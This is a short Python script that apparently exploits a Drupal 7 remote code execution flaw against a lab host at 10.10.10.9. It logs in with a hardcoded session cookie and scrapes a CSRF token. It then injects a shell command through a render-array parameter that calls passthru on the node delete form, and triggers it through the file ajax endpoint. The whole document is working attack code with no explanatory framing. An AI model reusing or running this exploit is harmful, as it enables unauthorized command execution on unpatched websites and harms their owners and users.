#!/usr/bin/python3

import requests
import re

host = 'http://10.10.10.9'
cookie = 'SESSd873f26fc11f2b7e6e4aa0f6fce59913=9FEf_73WXW8Wqaaie4xPwOTGSQhM2bfKpr70Fwurt4o'
headers = { 'Cookie': cookie }
node = 1
command = 'dir'

url = '{}/node/{}/delete'.format(host, node)
r = requests.get(url, headers = headers, verify = False)
match = re.search(r'>\n<input type="hidden" name="form_token" value="([^"]+)" />', r.text )
csrf = match.group(1)
if csrf is None:
    print('[-] csrf token not found')
    exit(1)

url = '{}/?q=node/{}/delete&destination=node?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]={}'.format(host, node, command, headers = { 'Cookie': cookie })
data = { 'form_id': 'node_delete_confirm', '_triggering_element_name': 'form_id', 'form_token': csrf }
r = requests.post(url, data = data, headers = headers)
match = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
form_build_id = match.group(1)
if form_build_id is None:
    print('[-] form_build_id not found')
    exit(1)

url = '{}/?q=file/ajax/actions/cancel/%23options/path/{}'.format(host, form_build_id)
data = { 'form_build_id': form_build_id }
r = requests.post(url, data = data, headers = headers)
result = '\n'.join(r.text.split('\n')[:-1])
print(result)
